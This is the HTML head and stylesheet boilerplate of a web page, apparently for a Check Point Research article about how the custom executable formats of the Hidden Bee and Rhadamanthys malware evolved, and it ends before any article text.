<!DOCTYPE html>
<html lang="en-US">
<head>
<meta http-equiv="content-type" content="text/html" charset="UTF-8" />
<meta name="description" content="Latest Research by our Team" /><meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="pingback" href="https://research.checkpoint.com/xmlrpc.php" />
<style>
/*region wordpress core*/
.alignnone {margin: 5px 20px 20px 0;}.aligncenter, div.aligncenter {display: block;margin: 5px auto 5px auto;}.alignright {float:right;margin: 5px 0 20px 20px;}.alignleft {float: left;margin: 5px 20px 20px 0;}a img.alignright {float: right;margin: 5px 0 20px 20px;}a img.alignnone {margin: 5px 20px 20px 0;}a img.alignleft {float: left;margin: 5px 20px 20px 0;}a img.aligncenter {display: block;margin-left: auto;margin-right: auto;}.wp-caption {background: #fff;border: 1px solid #f0f0f0;max-width: 96%;padding: 5px 3px 10px;text-align: center;}.wp-caption.alignnone {margin: 5px 20px 20px 0;}.wp-caption.alignleft {margin: 5px 20px 20px 0;}.wp-caption.alignright {margin: 5px 0 20px 20px;}.wp-caption img {border: 0 none;height: auto;margin: 0;max-width: 98.5%;padding: 0;width: auto;}.wp-caption p.wp-caption-text {font-size: 11px;line-height: 17px;margin: 0;padding: 0 4px 5px;}.screen-reader-text {border: 0;clip: rect(1px, 1px, 1px, 1px);clip-path: inset(50%);height: 1px;margin: -1px;overflow: hidden;padding: 0;position: absolute !important;width: 1px;word-wrap: normal !important;}.screen-reader-text:focus {background-color: #eee;clip: auto !important;clip-path: none;color: #444;display: block;font-size: 1em;height: auto;left: 5px;line-height: normal;padding: 15px 23px 14px;text-decoration: none;top: 5px;width: auto;z-index: 100000;}
.dmbs-container {}.dmbs-header {}.dmbs-header-img {}.dmbs-header-text {}.dmbs-top-menu {}.dmbs-content {}.dmbs-main {}.dmbs-left {}.dmbs-right {}.dmbs-footer-menu {}.dmbs-author-credits {}.dmbs-footer {}
/*endregion*/
/*region slick-slider*/
.slick-slider {position: relative;display: block;box-sizing: border-box;-webkit-user-select: none;-moz-user-select: none;-ms-user-select: none;user-select: none;-webkit-touch-callout: none;-khtml-user-select: none;-ms-touch-action: pan-y;touch-action: pan-y;-webkit-tap-highlight-color: transparent;}.slick-list {position: relative;display: block;overflow: hidden;margin: 0;padding: 0;}.slick-list:focus {outline: none;}.slick-list.dragging {cursor: pointer;cursor: hand;}.slick-slider .slick-track, .slick-slider .slick-list {-webkit-transform: translate3d(0, 0, 0);-moz-transform: translate3d(0, 0, 0);-ms-transform: translate3d(0, 0, 0);-o-transform: translate3d(0, 0, 0);transform: translate3d(0, 0, 0);}.slick-track {position: relative;top: 0;left: 0;display: block;}.slick-track:before, .slick-track:after {display: table;content: '';}.slick-track:after {clear: both;}.slick-loading .slick-track {visibility: hidden;}.slick-slide {display: none;float: left;height: 100%--;min-height: 1px;}[dir='rtl'] .slick-slide {float: right;}.slick-slide img {display: block;}.slick-slide.slick-loading img {display: none;}.slick-slide.dragging img {pointer-events: none;}.slick-initialized .slick-slide {display: block;}.slick-loading .slick-slide {visibility: hidden;}.slick-vertical .slick-slide {display: block;height: auto;border: 1px solid transparent;}.slick-arrow.slick-hidden {display: none;}
/*endregion*/
/*region AOS*/
[data-aos][data-aos][data-aos-duration="50"],body[data-aos-duration="50"] [data-aos]{transition-duration:50ms}[data-aos][data-aos][data-aos-delay="50"],body[data-aos-delay="50"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="50"].aos-animate,body[data-aos-delay="50"] [data-aos].aos-animate{transition-delay:50ms}[data-aos][data-aos][data-aos-duration="100"],body[data-aos-duration="100"] [data-aos]{transition-duration:.1s}[data-aos][data-aos][data-aos-delay="100"],body[data-aos-delay="100"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="100"].aos-animate,body[data-aos-delay="100"] [data-aos].aos-animate{transition-delay:.1s}[data-aos][data-aos][data-aos-duration="150"],body[data-aos-duration="150"] [data-aos]{transition-duration:.15s}[data-aos][data-aos][data-aos-delay="150"],body[data-aos-delay="150"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="150"].aos-animate,body[data-aos-delay="150"] [data-aos].aos-animate{transition-delay:.15s}[data-aos][data-aos][data-aos-duration="200"],body[data-aos-duration="200"] [data-aos]{transition-duration:.2s}[data-aos][data-aos][data-aos-delay="200"],body[data-aos-delay="200"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="200"].aos-animate,body[data-aos-delay="200"] [data-aos].aos-animate{transition-delay:.2s}[data-aos][data-aos][data-aos-duration="250"],body[data-aos-duration="250"] [data-aos]{transition-duration:.25s}[data-aos][data-aos][data-aos-delay="250"],body[data-aos-delay="250"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="250"].aos-animate,body[data-aos-delay="250"] [data-aos].aos-animate{transition-delay:.25s}[data-aos][data-aos][data-aos-duration="300"],body[data-aos-duration="300"] [data-aos]{transition-duration:.3s}[data-aos][data-aos][data-aos-delay="300"],body[data-aos-delay="300"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="300"].aos-animate,body[data-aos-delay="300"] [data-aos].aos-animate{transition-delay:.3s}[data-aos][data-aos][data-aos-duration="350"],body[data-aos-duration="350"] [data-aos]{transition-duration:.35s}[data-aos][data-aos][data-aos-delay="350"],body[data-aos-delay="350"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="350"].aos-animate,body[data-aos-delay="350"] [data-aos].aos-animate{transition-delay:.35s}[data-aos][data-aos][data-aos-duration="400"],body[data-aos-duration="400"] [data-aos]{transition-duration:.4s}[data-aos][data-aos][data-aos-delay="400"],body[data-aos-delay="400"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="400"].aos-animate,body[data-aos-delay="400"] [data-aos].aos-animate{transition-delay:.4s}[data-aos][data-aos][data-aos-duration="450"],body[data-aos-duration="450"] [data-aos]{transition-duration:.45s}[data-aos][data-aos][data-aos-delay="450"],body[data-aos-delay="450"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="450"].aos-animate,body[data-aos-delay="450"] [data-aos].aos-animate{transition-delay:.45s}[data-aos][data-aos][data-aos-duration="500"],body[data-aos-duration="500"] [data-aos]{transition-duration:.5s}[data-aos][data-aos][data-aos-delay="500"],body[data-aos-delay="500"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="500"].aos-animate,body[data-aos-delay="500"] [data-aos].aos-animate{transition-delay:.5s}[data-aos][data-aos][data-aos-duration="550"],body[data-aos-duration="550"] [data-aos]{transition-duration:.55s}[data-aos][data-aos][data-aos-delay="550"],body[data-aos-delay="550"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="550"].aos-animate,body[data-aos-delay="550"] [data-aos].aos-animate{transition-delay:.55s}[data-aos][data-aos][data-aos-duration="600"],body[data-aos-duration="600"] [data-aos]{transition-duration:.6s}[data-aos][data-aos][data-aos-delay="600"],body[data-aos-delay="600"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="600"].aos-animate,body[data-aos-delay="600"] [data-aos].aos-animate{transition-delay:.6s}[data-aos][data-aos][data-aos-duration="650"],body[data-aos-duration="650"] [data-aos]{transition-duration:.65s}[data-aos][data-aos][data-aos-delay="650"],body[data-aos-delay="650"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="650"].aos-animate,body[data-aos-delay="650"] [data-aos].aos-animate{transition-delay:.65s}[data-aos][data-aos][data-aos-duration="700"],body[data-aos-duration="700"] [data-aos]{transition-duration:.7s}[data-aos][data-aos][data-aos-delay="700"],body[data-aos-delay="700"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="700"].aos-animate,body[data-aos-delay="700"] [data-aos].aos-animate{transition-delay:.7s}[data-aos][data-aos][data-aos-duration="750"],body[data-aos-duration="750"] [data-aos]{transition-duration:.75s}[data-aos][data-aos][data-aos-delay="750"],body[data-aos-delay="750"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="750"].aos-animate,body[data-aos-delay="750"] [data-aos].aos-animate{transition-delay:.75s}[data-aos][data-aos][data-aos-duration="800"],body[data-aos-duration="800"] [data-aos]{transition-duration:.8s}[data-aos][data-aos][data-aos-delay="800"],body[data-aos-delay="800"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="800"].aos-animate,body[data-aos-delay="800"] [data-aos].aos-animate{transition-delay:.8s}[data-aos][data-aos][data-aos-duration="850"],body[data-aos-duration="850"] [data-aos]{transition-duration:.85s}[data-aos][data-aos][data-aos-delay="850"],body[data-aos-delay="850"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="850"].aos-animate,body[data-aos-delay="850"] [data-aos].aos-animate{transition-delay:.85s}[data-aos][data-aos][data-aos-duration="900"],body[data-aos-duration="900"] [data-aos]{transition-duration:.9s}[data-aos][data-aos][data-aos-delay="900"],body[data-aos-delay="900"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="900"].aos-animate,body[data-aos-delay="900"] [data-aos].aos-animate{transition-delay:.9s}[data-aos][data-aos][data-aos-duration="950"],body[data-aos-duration="950"] [data-aos]{transition-duration:.95s}[data-aos][data-aos][data-aos-delay="950"],body[data-aos-delay="950"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="950"].aos-animate,body[data-aos-delay="950"] [data-aos].aos-animate{transition-delay:.95s}[data-aos][data-aos][data-aos-duration="1000"],body[data-aos-duration="1000"] [data-aos]{transition-duration:1s}[data-aos][data-aos][data-aos-delay="1000"],body[data-aos-delay="1000"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="1000"].aos-animate,body[data-aos-delay="1000"] [data-aos].aos-animate{transition-delay:1s}[data-aos][data-aos][data-aos-duration="1050"],body[data-aos-duration="1050"] [data-aos]{transition-duration:1.05s}[data-aos][data-aos][data-aos-delay="1050"],body[data-aos-delay="1050"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="1050"].aos-animate,body[data-aos-delay="1050"] [data-aos].aos-animate{transition-delay:1.05s}[data-aos][data-aos][data-aos-duration="1100"],body[data-aos-duration="1100"] [data-aos]{transition-duration:1.1s}[data-aos][data-aos][data-aos-delay="1100"],body[data-aos-delay="1100"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="1100"].aos-animate,body[data-aos-delay="1100"] [data-aos].aos-animate{transition-delay:1.1s}[data-aos][data-aos][data-aos-duration="1150"],body[data-aos-duration="1150"] [data-aos]{transition-duration:1.15s}[data-aos][data-aos][data-aos-delay="1150"],body[data-aos-delay="1150"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="1150"].aos-animate,body[data-aos-delay="1150"] [data-aos].aos-animate{transition-delay:1.15s}[data-aos][data-aos][data-aos-duration="1200"],body[data-aos-duration="1200"] [data-aos]{transition-duration:1.2s}[data-aos][data-aos][data-aos-delay="1200"],body[data-aos-delay="1200"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="1200"].aos-animate,body[data-aos-delay="1200"] [data-aos].aos-animate{transition-delay:1.2s}[data-aos][data-aos][data-aos-duration="1250"],body[data-aos-duration="1250"] [data-aos]{transition-duration:1.25s}[data-aos][data-aos][data-aos-delay="1250"],body[data-aos-delay="1250"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="1250"].aos-animate,body[data-aos-delay="1250"] [data-aos].aos-animate{transition-delay:1.25s}[data-aos][data-aos][data-aos-duration="1300"],body[data-aos-duration="1300"] [data-aos]{transition-duration:1.3s}[data-aos][data-aos][data-aos-delay="1300"],body[data-aos-delay="1300"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="1300"].aos-animate,body[data-aos-delay="1300"] [data-aos].aos-animate{transition-delay:1.3s}[data-aos][data-aos][data-aos-duration="1350"],body[data-aos-duration="1350"] [data-aos]{transition-duration:1.35s}[data-aos][data-aos][data-aos-delay="1350"],body[data-aos-delay="1350"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="1350"].aos-animate,body[data-aos-delay="1350"] [data-aos].aos-animate{transition-delay:1.35s}[data-aos][data-aos][data-aos-duration="1400"],body[data-aos-duration="1400"] [data-aos]{transition-duration:1.4s}[data-aos][data-aos][data-aos-delay="1400"],body[data-aos-delay="1400"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="1400"].aos-animate,body[data-aos-delay="1400"] [data-aos].aos-animate{transition-delay:1.4s}[data-aos][data-aos][data-aos-duration="1450"],body[data-aos-duration="1450"] [data-aos]{transition-duration:1.45s}[data-aos][data-aos][data-aos-delay="1450"],body[data-aos-delay="1450"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="1450"].aos-animate,body[data-aos-delay="1450"] [data-aos].aos-animate{transition-delay:1.45s}[data-aos][data-aos][data-aos-duration="1500"],body[data-aos-duration="1500"] [data-aos]{transition-duration:1.5s}[data-aos][data-aos][data-aos-delay="1500"],body[data-aos-delay="1500"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="1500"].aos-animate,body[data-aos-delay="1500"] [data-aos].aos-animate{transition-delay:1.5s}[data-aos][data-aos][data-aos-duration="1550"],body[data-aos-duration="1550"] [data-aos]{transition-duration:1.55s}[data-aos][data-aos][data-aos-delay="1550"],body[data-aos-delay="1550"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="1550"].aos-animate,body[data-aos-delay="1550"] [data-aos].aos-animate{transition-delay:1.55s}[data-aos][data-aos][data-aos-duration="1600"],body[data-aos-duration="1600"] [data-aos]{transition-duration:1.6s}[data-aos][data-aos][data-aos-delay="1600"],body[data-aos-delay="1600"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="1600"].aos-animate,body[data-aos-delay="1600"] [data-aos].aos-animate{transition-delay:1.6s}[data-aos][data-aos][data-aos-duration="1650"],body[data-aos-duration="1650"] [data-aos]{transition-duration:1.65s}[data-aos][data-aos][data-aos-delay="1650"],body[data-aos-delay="1650"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="1650"].aos-animate,body[data-aos-delay="1650"] [data-aos].aos-animate{transition-delay:1.65s}[data-aos][data-aos][data-aos-duration="1700"],body[data-aos-duration="1700"] [data-aos]{transition-duration:1.7s}[data-aos][data-aos][data-aos-delay="1700"],body[data-aos-delay="1700"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="1700"].aos-animate,body[data-aos-delay="1700"] [data-aos].aos-animate{transition-delay:1.7s}[data-aos][data-aos][data-aos-duration="1750"],body[data-aos-duration="1750"] [data-aos]{transition-duration:1.75s}[data-aos][data-aos][data-aos-delay="1750"],body[data-aos-delay="1750"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="1750"].aos-animate,body[data-aos-delay="1750"] [data-aos].aos-animate{transition-delay:1.75s}[data-aos][data-aos][data-aos-duration="1800"],body[data-aos-duration="1800"] [data-aos]{transition-duration:1.8s}[data-aos][data-aos][data-aos-delay="1800"],body[data-aos-delay="1800"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="1800"].aos-animate,body[data-aos-delay="1800"] [data-aos].aos-animate{transition-delay:1.8s}[data-aos][data-aos][data-aos-duration="1850"],body[data-aos-duration="1850"] [data-aos]{transition-duration:1.85s}[data-aos][data-aos][data-aos-delay="1850"],body[data-aos-delay="1850"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="1850"].aos-animate,body[data-aos-delay="1850"] [data-aos].aos-animate{transition-delay:1.85s}[data-aos][data-aos][data-aos-duration="1900"],body[data-aos-duration="1900"] [data-aos]{transition-duration:1.9s}[data-aos][data-aos][data-aos-delay="1900"],body[data-aos-delay="1900"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="1900"].aos-animate,body[data-aos-delay="1900"] [data-aos].aos-animate{transition-delay:1.9s}[data-aos][data-aos][data-aos-duration="1950"],body[data-aos-duration="1950"] [data-aos]{transition-duration:1.95s}[data-aos][data-aos][data-aos-delay="1950"],body[data-aos-delay="1950"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="1950"].aos-animate,body[data-aos-delay="1950"] [data-aos].aos-animate{transition-delay:1.95s}[data-aos][data-aos][data-aos-duration="2000"],body[data-aos-duration="2000"] [data-aos]{transition-duration:2s}[data-aos][data-aos][data-aos-delay="2000"],body[data-aos-delay="2000"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="2000"].aos-animate,body[data-aos-delay="2000"] [data-aos].aos-animate{transition-delay:2s}[data-aos][data-aos][data-aos-duration="2050"],body[data-aos-duration="2050"] [data-aos]{transition-duration:2.05s}[data-aos][data-aos][data-aos-delay="2050"],body[data-aos-delay="2050"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="2050"].aos-animate,body[data-aos-delay="2050"] [data-aos].aos-animate{transition-delay:2.05s}[data-aos][data-aos][data-aos-duration="2100"],body[data-aos-duration="2100"] [data-aos]{transition-duration:2.1s}[data-aos][data-aos][data-aos-delay="2100"],body[data-aos-delay="2100"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="2100"].aos-animate,body[data-aos-delay="2100"] [data-aos].aos-animate{transition-delay:2.1s}[data-aos][data-aos][data-aos-duration="2150"],body[data-aos-duration="2150"] [data-aos]{transition-duration:2.15s}[data-aos][data-aos][data-aos-delay="2150"],body[data-aos-delay="2150"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="2150"].aos-animate,body[data-aos-delay="2150"] [data-aos].aos-animate{transition-delay:2.15s}[data-aos][data-aos][data-aos-duration="2200"],body[data-aos-duration="2200"] [data-aos]{transition-duration:2.2s}[data-aos][data-aos][data-aos-delay="2200"],body[data-aos-delay="2200"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="2200"].aos-animate,body[data-aos-delay="2200"] [data-aos].aos-animate{transition-delay:2.2s}[data-aos][data-aos][data-aos-duration="2250"],body[data-aos-duration="2250"] [data-aos]{transition-duration:2.25s}[data-aos][data-aos][data-aos-delay="2250"],body[data-aos-delay="2250"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="2250"].aos-animate,body[data-aos-delay="2250"] [data-aos].aos-animate{transition-delay:2.25s}[data-aos][data-aos][data-aos-duration="2300"],body[data-aos-duration="2300"] [data-aos]{transition-duration:2.3s}[data-aos][data-aos][data-aos-delay="2300"],body[data-aos-delay="2300"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="2300"].aos-animate,body[data-aos-delay="2300"] [data-aos].aos-animate{transition-delay:2.3s}[data-aos][data-aos][data-aos-duration="2350"],body[data-aos-duration="2350"] [data-aos]{transition-duration:2.35s}[data-aos][data-aos][data-aos-delay="2350"],body[data-aos-delay="2350"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="2350"].aos-animate,body[data-aos-delay="2350"] [data-aos].aos-animate{transition-delay:2.35s}[data-aos][data-aos][data-aos-duration="2400"],body[data-aos-duration="2400"] [data-aos]{transition-duration:2.4s}[data-aos][data-aos][data-aos-delay="2400"],body[data-aos-delay="2400"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="2400"].aos-animate,body[data-aos-delay="2400"] [data-aos].aos-animate{transition-delay:2.4s}[data-aos][data-aos][data-aos-duration="2450"],body[data-aos-duration="2450"] [data-aos]{transition-duration:2.45s}[data-aos][data-aos][data-aos-delay="2450"],body[data-aos-delay="2450"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="2450"].aos-animate,body[data-aos-delay="2450"] [data-aos].aos-animate{transition-delay:2.45s}[data-aos][data-aos][data-aos-duration="2500"],body[data-aos-duration="2500"] [data-aos]{transition-duration:2.5s}[data-aos][data-aos][data-aos-delay="2500"],body[data-aos-delay="2500"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="2500"].aos-animate,body[data-aos-delay="2500"] [data-aos].aos-animate{transition-delay:2.5s}[data-aos][data-aos][data-aos-duration="2550"],body[data-aos-duration="2550"] [data-aos]{transition-duration:2.55s}[data-aos][data-aos][data-aos-delay="2550"],body[data-aos-delay="2550"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="2550"].aos-animate,body[data-aos-delay="2550"] [data-aos].aos-animate{transition-delay:2.55s}[data-aos][data-aos][data-aos-duration="2600"],body[data-aos-duration="2600"] [data-aos]{transition-duration:2.6s}[data-aos][data-aos][data-aos-delay="2600"],body[data-aos-delay="2600"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="2600"].aos-animate,body[data-aos-delay="2600"] [data-aos].aos-animate{transition-delay:2.6s}[data-aos][data-aos][data-aos-duration="2650"],body[data-aos-duration="2650"] [data-aos]{transition-duration:2.65s}[data-aos][data-aos][data-aos-delay="2650"],body[data-aos-delay="2650"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="2650"].aos-animate,body[data-aos-delay="2650"] [data-aos].aos-animate{transition-delay:2.65s}[data-aos][data-aos][data-aos-duration="2700"],body[data-aos-duration="2700"] [data-aos]{transition-duration:2.7s}[data-aos][data-aos][data-aos-delay="2700"],body[data-aos-delay="2700"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="2700"].aos-animate,body[data-aos-delay="2700"] [data-aos].aos-animate{transition-delay:2.7s}[data-aos][data-aos][data-aos-duration="2750"],body[data-aos-duration="2750"] [data-aos]{transition-duration:2.75s}[data-aos][data-aos][data-aos-delay="2750"],body[data-aos-delay="2750"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="2750"].aos-animate,body[data-aos-delay="2750"] [data-aos].aos-animate{transition-delay:2.75s}[data-aos][data-aos][data-aos-duration="2800"],body[data-aos-duration="2800"] [data-aos]{transition-duration:2.8s}[data-aos][data-aos][data-aos-delay="2800"],body[data-aos-delay="2800"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="2800"].aos-animate,body[data-aos-delay="2800"] [data-aos].aos-animate{transition-delay:2.8s}[data-aos][data-aos][data-aos-duration="2850"],body[data-aos-duration="2850"] [data-aos]{transition-duration:2.85s}[data-aos][data-aos][data-aos-delay="2850"],body[data-aos-delay="2850"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="2850"].aos-animate,body[data-aos-delay="2850"] [data-aos].aos-animate{transition-delay:2.85s}[data-aos][data-aos][data-aos-duration="2900"],body[data-aos-duration="2900"] [data-aos]{transition-duration:2.9s}[data-aos][data-aos][data-aos-delay="2900"],body[data-aos-delay="2900"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="2900"].aos-animate,body[data-aos-delay="2900"] [data-aos].aos-animate{transition-delay:2.9s}[data-aos][data-aos][data-aos-duration="2950"],body[data-aos-duration="2950"] [data-aos]{transition-duration:2.95s}[data-aos][data-aos][data-aos-delay="2950"],body[data-aos-delay="2950"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="2950"].aos-animate,body[data-aos-delay="2950"] [data-aos].aos-animate{transition-delay:2.95s}[data-aos][data-aos][data-aos-duration="3000"],body[data-aos-duration="3000"] [data-aos]{transition-duration:3s}[data-aos][data-aos][data-aos-delay="3000"],body[data-aos-delay="3000"] [data-aos]{transition-delay:0}[data-aos][data-aos][data-aos-delay="3000"].aos-animate,body[data-aos-delay="3000"] [data-aos].aos-animate{transition-delay:3s}[data-aos][data-aos][data-aos-easing=linear],body[data-aos-easing=linear] [data-aos]{transition-timing-function:cubic-bezier(.25,.25,.75,.75)}[data-aos][data-aos][data-aos-easing=ease],body[data-aos-easing=ease] [data-aos]{transition-timing-function:ease}[data-aos][data-aos][data-aos-easing=ease-in],body[data-aos-easing=ease-in] [data-aos]{transition-timing-function:ease-in}[data-aos][data-aos][data-aos-easing=ease-out],body[data-aos-easing=ease-out] [data-aos]{transition-timing-function:ease-out}[data-aos][data-aos][data-aos-easing=ease-in-out],body[data-aos-easing=ease-in-out] [data-aos]{transition-timing-function:ease-in-out}[data-aos][data-aos][data-aos-easing=ease-in-back],body[data-aos-easing=ease-in-back] [data-aos]{transition-timing-function:cubic-bezier(.6,-.28,.735,.045)}[data-aos][data-aos][data-aos-easing=ease-out-back],body[data-aos-easing=ease-out-back] [data-aos]{transition-timing-function:cubic-bezier(.175,.885,.32,1.275)}[data-aos][data-aos][data-aos-easing=ease-in-out-back],body[data-aos-easing=ease-in-out-back] [data-aos]{transition-timing-function:cubic-bezier(.68,-.55,.265,1.55)}[data-aos][data-aos][data-aos-easing=ease-in-sine],body[data-aos-easing=ease-in-sine] [data-aos]{transition-timing-function:cubic-bezier(.47,0,.745,.715)}[data-aos][data-aos][data-aos-easing=ease-out-sine],body[data-aos-easing=ease-out-sine] [data-aos]{transition-timing-function:cubic-bezier(.39,.575,.565,1)}[data-aos][data-aos][data-aos-easing=ease-in-out-sine],body[data-aos-easing=ease-in-out-sine] [data-aos]{transition-timing-function:cubic-bezier(.445,.05,.55,.95)}[data-aos][data-aos][data-aos-easing=ease-in-quad],body[data-aos-easing=ease-in-quad] [data-aos]{transition-timing-function:cubic-bezier(.55,.085,.68,.53)}[data-aos][data-aos][data-aos-easing=ease-out-quad],body[data-aos-easing=ease-out-quad] [data-aos]{transition-timing-function:cubic-bezier(.25,.46,.45,.94)}[data-aos][data-aos][data-aos-easing=ease-in-out-quad],body[data-aos-easing=ease-in-out-quad] [data-aos]{transition-timing-function:cubic-bezier(.455,.03,.515,.955)}[data-aos][data-aos][data-aos-easing=ease-in-cubic],body[data-aos-easing=ease-in-cubic] [data-aos]{transition-timing-function:cubic-bezier(.55,.085,.68,.53)}[data-aos][data-aos][data-aos-easing=ease-out-cubic],body[data-aos-easing=ease-out-cubic] [data-aos]{transition-timing-function:cubic-bezier(.25,.46,.45,.94)}[data-aos][data-aos][data-aos-easing=ease-in-out-cubic],body[data-aos-easing=ease-in-out-cubic] [data-aos]{transition-timing-function:cubic-bezier(.455,.03,.515,.955)}[data-aos][data-aos][data-aos-easing=ease-in-quart],body[data-aos-easing=ease-in-quart] [data-aos]{transition-timing-function:cubic-bezier(.55,.085,.68,.53)}[data-aos][data-aos][data-aos-easing=ease-out-quart],body[data-aos-easing=ease-out-quart] [data-aos]{transition-timing-function:cubic-bezier(.25,.46,.45,.94)}[data-aos][data-aos][data-aos-easing=ease-in-out-quart],body[data-aos-easing=ease-in-out-quart] [data-aos]{transition-timing-function:cubic-bezier(.455,.03,.515,.955)}[data-aos^=fade][data-aos^=fade]{opacity:0;transition-property:opacity,transform}[data-aos^=fade][data-aos^=fade].aos-animate{opacity:1;transform:translateZ(0)}[data-aos=fade-up]{transform:translate3d(0,100px,0)}[data-aos=fade-down]{transform:translate3d(0,-100px,0)}[data-aos=fade-right]{transform:translate3d(-100px,0,0)}[data-aos=fade-left]{transform:translate3d(100px,0,0)}[data-aos=fade-up-right]{transform:translate3d(-100px,100px,0)}[data-aos=fade-up-left]{transform:translate3d(100px,100px,0)}[data-aos=fade-down-right]{transform:translate3d(-100px,-100px,0)}[data-aos=fade-down-left]{transform:translate3d(100px,-100px,0)}[data-aos^=zoom][data-aos^=zoom]{opacity:0;transition-property:opacity,transform}[data-aos^=zoom][data-aos^=zoom].aos-animate{opacity:1;transform:translateZ(0) scale(1)}[data-aos=zoom-in]{transform:scale(.6)}[data-aos=zoom-in-up]{transform:translate3d(0,100px,0) scale(.6)}[data-aos=zoom-in-down]{transform:translate3d(0,-100px,0) scale(.6)}[data-aos=zoom-in-right]{transform:translate3d(-100px,0,0) scale(.6)}[data-aos=zoom-in-left]{transform:translate3d(100px,0,0) scale(.6)}[data-aos=zoom-out]{transform:scale(1.2)}[data-aos=zoom-out-up]{transform:translate3d(0,100px,0) scale(1.2)}[data-aos=zoom-out-down]{transform:translate3d(0,-100px,0) scale(1.2)}[data-aos=zoom-out-right]{transform:translate3d(-100px,0,0) scale(1.2)}[data-aos=zoom-out-left]{transform:translate3d(100px,0,0) scale(1.2)}[data-aos^=slide][data-aos^=slide]{transition-property:transform}[data-aos^=slide][data-aos^=slide].aos-animate{transform:translateZ(0)}[data-aos=slide-up]{transform:translate3d(0,100%,0)}[data-aos=slide-down]{transform:translate3d(0,-100%,0)}[data-aos=slide-right]{transform:translate3d(-100%,0,0)}[data-aos=slide-left]{transform:translate3d(100%,0,0)}[data-aos^=flip][data-aos^=flip]{backface-visibility:hidden;transition-property:transform}[data-aos=flip-left]{transform:perspective(2500px) rotateY(-100deg)}[data-aos=flip-left].aos-animate{transform:perspective(2500px) rotateY(0)}[data-aos=flip-right]{transform:perspective(2500px) rotateY(100deg)}[data-aos=flip-right].aos-animate{transform:perspective(2500px) rotateY(0)}[data-aos=flip-up]{transform:perspective(2500px) rotateX(-100deg)}[data-aos=flip-up].aos-animate{transform:perspective(2500px) rotateX(0)}[data-aos=flip-down]{transform:perspective(2500px) rotateX(100deg)}[data-aos=flip-down].aos-animate{transform:perspective(2500px) rotateX(0)}
/*endregion*/
</style>
<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />

	<!-- This site is optimized with the Yoast SEO plugin v23.7 - https://yoast.com/wordpress/plugins/seo/ -->
	<title>From Hidden Bee to Rhadamanthys - The Evolution of Custom Executable Formats - Check Point Research</title>
	<link rel="canonical" href="https://research.checkpoint.com/2023/from-hidden-bee-to-rhadamanthys-the-evolution-of-custom-executable-formats/" />
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="From Hidden Bee to Rhadamanthys - The Evolution of Custom Executable Formats - Check Point Research" />
